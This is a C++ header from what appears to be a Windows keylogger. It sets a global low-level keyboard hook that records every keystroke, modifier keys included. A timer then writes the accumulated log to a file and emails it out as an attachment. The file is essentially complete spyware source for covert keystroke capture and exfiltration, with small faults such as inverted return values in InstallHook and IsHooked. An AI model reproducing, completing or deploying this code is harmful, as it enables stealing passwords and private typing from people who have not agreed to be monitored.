#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <Windows.h>
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = ""; // where store all key strokes are stored

void TimerSendMail()
{
	if (keylog.empty()) // do nothing if keylog is empty
		return;

	std::string last_file = IO::WriteLog(keylog);

	if (last_file.empty()) // if empty, write to debugging log (not successful)
	{
		Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
		return;
	}

	int x = Mail::SendMail("Log [" + last_file + "]", 
		"Hi :) \nThe file has been attached to this mail :)\nFor testing, enjoy!:\n" + keylog,
		IO::GetOurPath(true) + last_file);

	if (x != 7) // if mail was not sent
		Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
	else
		keylog = ""; // if sent clear keylog
}

Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite); // time to send (30 seconds)

HHOOK eHook = NULL; // pointer to our hook

LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // intercept key presses
{
	// wparam - key type, lparam - type of KBDLLHOOKSTRUCT
	// look in KeyConstants.h for key mapping
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);

	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) // check when key is pressed down or hold
	{
		keylog += Keys::KEYS[kbs->vkCode].Name; // use the system name from keyboard and use our map to convert it to a human friendly name
		if (kbs->vkCode == VK_RETURN) // new line if enter was pressed
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) // if key state is released, used for sys keys like SHIFT
	{
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL || key == VK_LCONTROL ||
			key == VK_RCONTROL || key == VK_SHIFT ||
			key == VK_RSHIFT || key == VK_LSHIFT ||
			key == VK_MENU || key == VK_LMENU ||
			key == VK_RMENU || key == VK_CAPITAL ||
			key == VK_NUMLOCK || key == VK_LWIN ||
			key == VK_RWIN)
		{
			std::string KeyName = Keys::KEYS[kbs->vkCode].Name; // translate key to human friendly name
			KeyName.insert(1, "/"); // insert like [SHIFT] [a] [b] [/SHIFT]
			keylog += KeyName;
		}
	}

	return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
	Helper::WriteAppLog("Hook started... Timer started"); // Debug message
	MailTimer.Start(true);

	// WH_KEYBOARD_LL - indicates we use keyboard hook and LL is low level -> global hook, value 13
	// OurKeyBoardProc - procedure invoked by hook system every time user press a key
	// GetModuleHandle serves for obatining H instance
	// DWTHREADID or 0 is identifier of thread which hook procedure is associated with (all existing threads)
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyBoardProc, GetModuleHandle(NULL), 0);
	return eHook == NULL;
}

bool UninstallHook() // disable hook, does not stop keylogger
{
	bool b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return (bool)b;
}

bool IsHooked()
{
	return (bool)(eHook == NULL);
}

#endif // KEYBHOOK_H